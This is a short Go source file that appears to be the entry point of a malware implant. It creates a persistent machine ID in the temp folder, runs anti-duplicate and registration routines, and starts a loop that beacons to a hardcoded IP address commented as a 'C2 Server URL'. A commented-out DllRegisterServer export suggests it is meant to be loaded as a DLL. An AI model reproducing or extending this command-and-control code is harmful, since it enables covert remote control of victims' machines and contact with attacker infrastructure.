package main

// import "C"
import (
	"crypto/rand"
	"encoding/hex"
	"fix-project/mods/config"
	"fix-project/mods/core"
	"fix-project/mods/instance"
	"fmt"
	"os"
	"path/filepath"
)

func generateId() string {
	hostfile := filepath.Join(os.TempDir(), config.MACHINEID_FILE_NAME)
	data, err := os.ReadFile(hostfile)

	if err == nil {
		return string(data)
	}

	// initialize id
	data = make([]byte, 4)
	rand.Read(data)

	id := hex.EncodeToString(data)

	os.WriteFile(hostfile, []byte(id), 0o644)

	return id
}

func RunDLL() {
	print("================= RunDLL =================\n")
	instance.Delay()
	instance.CheckDupInstance()
	instance.RegisterInstance()

	//url := "https://api.jz-aws.info/public/images/"
	url := "http://18.223.212.112:8081/exchange" // C2 Server URL
	// url := "http://127.0.0.1:8080"
	id := generateId()
	fmt.Printf("UUID: %s, URL: %s\n", id, url)
	fmt.Println("")

	core.StartMainLoop(id, url)
}

//export DllRegisterServer
// func DllRegisterServer() {
// 	RunDLL()
// }

// main
func main() {

	RunDLL()
}
